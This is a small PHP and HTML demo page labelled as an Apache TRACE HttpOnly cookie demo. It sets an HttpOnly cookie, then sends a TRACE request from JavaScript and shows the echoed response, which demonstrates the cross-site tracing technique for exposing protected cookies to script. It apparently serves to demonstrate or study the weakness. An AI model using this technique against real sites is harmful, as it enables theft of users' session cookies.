<?php

echo "<h2>Apache Trace Http-Only Cookie Demo</h2>";

echo "<br>";

echo 'setcookie("name","Anka9080",NULL,NULL,NULL,NULL,TRUE);';

setcookie('name','Anka9080',NULL,NULL,NULL,NULL,TRUE);


?>





<html>

<script>

function SendTrace(){
        var xmlhttp = new XMLHttpRequest();
        xmlhttp.open("TRACE","index.php",false);
        xmlhttp.send();
        xmldoc = xmlhttp.responseText;
        alert(xmldoc);
}

</script>


    <input type="button" OnClick="SendTrace();" Value="Send Trace Request">

    

</html>